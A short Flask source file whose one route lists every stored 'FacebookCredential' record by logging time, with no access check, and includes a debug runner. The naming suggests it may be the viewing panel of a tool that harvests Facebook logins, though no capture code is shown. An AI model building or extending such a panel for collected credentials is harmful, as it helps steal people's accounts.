import logging

from flask import abort, render_template, request, jsonify
from sqlalchemy import column, literal, literal_column, text

import models

from common import app, db

@app.route('/dashboard')
def dashboard():
	creds = models.FacebookCredential.query.order_by(models.FacebookCredential.logged_timestamp).all()
	return render_template('dashboard.html', credentials=creds)

if __name__ == '__main__':
    from os import sys, path
    sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))

    # Run locally in debug mode (gunicorn runs the app in production)
    app.run(host='127.0.0.1', port=8080, debug=True, threaded=True)
